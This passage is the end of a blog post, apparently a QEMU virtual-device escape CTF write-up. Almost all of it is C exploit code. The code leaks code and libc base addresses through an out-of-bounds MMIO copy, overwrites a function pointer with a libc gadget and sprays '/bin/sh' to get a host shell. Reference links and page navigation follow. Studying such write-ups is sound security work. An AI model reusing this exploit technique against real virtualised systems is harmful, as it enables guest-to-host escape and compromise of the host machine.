    int len = (int)sizeof(addr) / sizeof(*addr);
    for (int i = 0; i &lt; len; i++)
    &#123;
        memset(addr[i], i, 0x1000);
    &#125;
    int addrv2p[] = &#123;v2p(addr[0]), v2p(addr[1]), v2p(addr[2]), v2p(addr[3]), v2p(addr[4]), v2p(addr[5])&#125;;

    int addrv2p_sort[] = &#123;v2p(addr[0]), v2p(addr[1]), v2p(addr[2]), v2p(addr[3]), v2p(addr[4]), v2p(addr[5])&#125;;

    bubble_sort(addrv2p_sort, len);
    void *tmp1, *tmp2;

    for (int i = 0; i &lt; len - 1; i++)
    &#123;
        if ((addrv2p_sort[i + 1] - addrv2p_sort[i]) == 0x1000)
        &#123;
            tmp1 = addrv2p_sort[i];
            tmp2 = addrv2p_sort[i + 1];
            break;
        &#125;
    &#125;
    if(tmp1 == NULL)&#123;
        printf(&quot;[-]dont find neibor page&quot;);
        return 0;
    &#125;
    void *buf1, *buf2;
    for (int i = 0; i &lt; len; i++)
    &#123;
        if (addrv2p[i] == tmp1)
        &#123;
            buf1 = addr[i];
        &#125;
        if (addrv2p[i] == tmp2)
        &#123;
            buf2 = addr[i];
        &#125;
    &#125;

    // for (int i = 0; i &lt; len; i++)
    // &#123;
    //     printf(&quot;%llx %llx\n&quot;, addr[i], v2p(addr[i]));
    // &#125;
    // printf(&quot;%llx %llx\n&quot;, buf1, buf2);

    void *buf = malloc(0x1000);

    memset(buf, 0, 0x1000);

    mmio_write(16, 1); //CP_list_cnt = 1
    *(uint64_t *)(buf) = (uint64_t)0;
    uint64_t read_numbers = 0x1500;
    *(uint64_t *)(buf + 8) = (uint64_t)(read_numbers);
    *(uint64_t *)(buf + 16) = (uint64_t)v2p(buf1);
    mmio_write(8, v2p(buf)); //CP_list_src = buf1

    //-------------⬇

    //printf(&quot;cmd:0x%llx\n&quot;, mmio_read(24));
    // printf(&quot;buf1： &quot;);
    // for (int i=0x0;i&lt;0x1000;i+=8)&#123;
    //     printf(&quot;%llx &quot;,*(uint64_t*)(buf1+i));
    // &#125;
    // printf(&quot;\n&quot;);
    // printf(&quot;buf2： &quot;);
    // for (int i=0x0;i&lt;0x1000;i+=8)&#123;
    //     printf(&quot;%llx &quot;,*(uint64_t*)(buf2+i));
    // &#125;
    // printf(&quot;\n&quot;);
    //---------------

    mmio_write(24, 4); //cmd = 4 buf1fer -&gt; dst
    sleep(0.5);

    //-------------⬇

    //printf(&quot;cmd:0x%llx\n&quot;, mmio_read(24));
    // printf(&quot;buf1： &quot;);
    // for (int i=0x0;i&lt;0x1000;i+=8)&#123;
    //     printf(&quot;%llx &quot;,*(uint64_t*)(buf1+i));
    // &#125;
    // printf(&quot;\n&quot;);
    // printf(&quot;buf2： &quot;);
    // for (int i=0x0;i&lt;0x1000;i+=8)&#123;
    //     printf(&quot;%llx &quot;,*(uint64_t*)(buf2+i));
    // &#125;
    // printf(&quot;\n&quot;);

    uint64_t code_base = *(uint64_t *)(buf2 + 0x10) - 0x4dce80;
    uint64_t libc_base = *(uint64_t *)(buf2 + 0x258) - 0x3ebce0;
    uint64_t buffaddr = *(uint64_t *)(buf2 + 0x18)+0xa00;
    printf(&quot;[+]codebase:0x%llx\n[+]libcbase:0x%llx\n[+]buffaddr:0x%llx\n&quot;, code_base, libc_base,buffaddr);

    //0x10a38c 0x4f322 0x4f2c5  remote
    //local 0x4f3d5 0x4f432 0x10a41c

    *(uint64_t *)(buf2 + 0x10) =libc_base+0x4f550;//code_base+0x00005B5C15;// ////0x4f440;//;//code_base + 0x00005B5C15;
    *(uint64_t *)(buf2 + 0x18) = buffaddr;//
    //  oob write
    uint64_t CP_list_cnt = 0x11;
    mmio_write(16, CP_list_cnt);
    for (int i = 0; i &lt; CP_list_cnt; i++)
    &#123;
        *(uint64_t *)(buf + 8 * (i * 3)) = (uint64_t)(v2p(buf1)); // src
        *(uint64_t *)(buf + 8 * (i * 3 + 1)) = (uint64_t)(0x1020);
        *(uint64_t *)(buf + 8 * (i * 3 + 2)) = (uint64_t)(v2p(buf1)); //dst
    &#125;
    for (int i=0x0;i&lt;0x1000;i+=0x20)&#123;
        strcpy(buf1+i,&quot;/bin/sh\x00&quot;);
    &#125;

    mmio_write(8, v2p(buf)); //CP_list_src = buf;
    mmio_write(24, 1);       //cmd = 1
    sleep(0.5);

    //call
    mmio_write(24, 10);
    return 0;
&#125;</code></pre>
<p>exp多少有点粗糙，懒得改了。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://luohao-brian.gitbooks.io/interrupt-virtualization/content/kvmzhi-nei-cun-xu-ni531628-kvm-mmu-virtualization.html">Kernelgo’s KVM学习笔记</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6562">qemu pwn-基础知识-raycp</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8017">https://xz.aliyun.com/t/8017</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/52140921">https://zhuanlan.zhihu.com/p/52140921</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7345#toc-2">https://xz.aliyun.com/t/7345#toc-2</a></p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/bleedingtooth-CVE-2020-12351/" title="Linux 蓝牙bleedingtooth CVE-2020-12351学习记录"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Linux 蓝牙bleedingtooth CVE-2020-12351学习记录</span></a><a class="button is-default" href="/GeekPwn-2020-wp/" title="GeekPwn热身赛 2020 wp"><span class="has-text-weight-semibold">Next: GeekPwn热身赛 2020 wp</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Q1IQ" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/Q1iqF"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Q1IQ"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><a title="rss" target="_blank" rel="noopener nofollow" href="/atom.xml"><i class="iconfont icon-rss"></i></a><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Q1IQ 2022</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>